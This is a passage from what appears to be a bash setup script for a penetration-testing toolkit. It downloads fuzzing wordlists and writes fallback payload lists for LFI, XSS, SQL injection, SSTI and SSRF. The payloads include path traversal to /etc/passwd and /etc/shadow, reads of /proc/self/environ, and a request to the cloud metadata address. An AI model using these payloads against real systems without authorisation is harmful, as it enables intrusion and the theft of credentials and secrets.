...
if ! _has cloud_enum; then
    _apt cloud-enum cloud_enum 2>/dev/null || \
    _clone cloud_enum \
...
# ── LFI payloads ─────────────────────────────────────────────────────────────
_i "LFI payloads..."
_dlwl "$SL/Fuzzing/LFI/LFI-Jhaddix.txt"             wordlists/lfi_jhaddix.txt
_dlwl "$SL/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt"  wordlists/lfi_suite.txt
_dlwl "$SL/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt" wordlists/lfi_linux.txt
cat wordlists/lfi_*.txt 2>/dev/null | sort -u > wordlists/lfi_payloads.txt 2>/dev/null || true
[ -s wordlists/lfi_payloads.txt ] || printf \
    "../../etc/passwd\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\nphp://filter/read=convert.base64-encode/resource=/etc/passwd\n/etc/passwd\n/etc/shadow\n/proc/self/environ\n" \
    > wordlists/lfi_payloads.txt
rm -f wordlists/lfi_*.txt 2>/dev/null || true
_ok "LFI payloads: $(wc -l < wordlists/lfi_payloads.txt 2>/dev/null || echo 0)"

# ── XSS payloads ─────────────────────────────────────────────────────────────
_i "XSS payloads..."
_dlwl "$SL/Fuzzing/XSS/XSS-Jhaddix.txt"     wordlists/xss_jhaddix.txt
_dlwl "$SL/Fuzzing/XSS/XSS-BruteLogic.txt"  wordlists/xss_brute.txt
_dlwl "$SL/Fuzzing/XSS/xss-without-parentheses-semi-colons.txt" wordlists/xss_np.txt
cat wordlists/xss_*.txt 2>/dev/null | sort -u > wordlists/xss_payloads.txt 2>/dev/null || true
[ -s wordlists/xss_payloads.txt ] || printf \
    '<script>alert(1)</script>\n"><script>alert(1)</script>\n<svg/onload=alert(1)>\nimgSrc=x onerror=alert(1)>\n<img src=x onerror=alert(1)>\n' \
    > wordlists/xss_payloads.txt
rm -f wordlists/xss_*.txt 2>/dev/null || true
_ok "XSS payloads: $(wc -l < wordlists/xss_payloads.txt 2>/dev/null || echo 0)"

# ── SQLi payloads ─────────────────────────────────────────────────────────────
_i "SQLi payloads..."
_dlwl "$SL/Fuzzing/SQLi/Generic-SQLi.txt"             wordlists/sqli_generic.txt
_dlwl "$SL/Fuzzing/SQLi/quick-SQLi.txt"               wordlists/sqli_quick.txt
_dlwl "$SL/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt" wordlists/sqli_blind.txt
cat wordlists/sqli_*.txt 2>/dev/null | sort -u > wordlists/sqli_payloads.txt 2>/dev/null || true
[ -s wordlists/sqli_payloads.txt ] || printf \
    "' OR '1'='1\n' OR 1=1--\n\" OR 1=1--\n' AND SLEEP(5)--\n') OR ('1'='1\n1 UNION SELECT NULL--\n" \
    > wordlists/sqli_payloads.txt
rm -f wordlists/sqli_*.txt 2>/dev/null || true
_ok "SQLi payloads: $(wc -l < wordlists/sqli_payloads.txt 2>/dev/null || echo 0)"

# ── SSTI payloads ─────────────────────────────────────────────────────────────
[ -s wordlists/ssti_payloads.txt ] || printf \
    '{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}\n*{7*7}\n{{config}}\n{{self}}\n{{request}}\n' \
    > wordlists/ssti_payloads.txt

# ── SSRF payloads ─────────────────────────────────────────────────────────────
[ -s wordlists/ssrf_payloads.txt ] || printf \
    "http://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1/admin\nhttp://localhost/admin\nhttp://0.0.0.0/admin\nhttp://[::1]/admin\n" \
    > wordlists/ssrf_payloads.txt

# ── API paths ─────────────────────────────────────────────────────────────────
_dlwl "$SL/Discovery/Web-Content/api/api-endpoints.txt" wordlists/api_endpoints.txt
_dlwl "$SL/Discovery/Web-Content/api/objects.txt"        wordlists/api_objects.txt
cat wordlists/api_endpoints.txt wordlists/api_objects.txt 2>/dev/null \
    | sort -u > wordlists/api_paths.txt 2>/dev/null || true
[ -s wordlists/api_paths.txt ] || printf \
    "/api/v1/users\n/api/v2/users\n/api/admin\n/api/config\n/api/health\n/api/debug\n/api/token\n/api/login\n" \
    > wordlists/api_paths.txt
rm -f wordlists/api_endpoints.txt wordlists/api_objects.txt 2>/dev/null || true
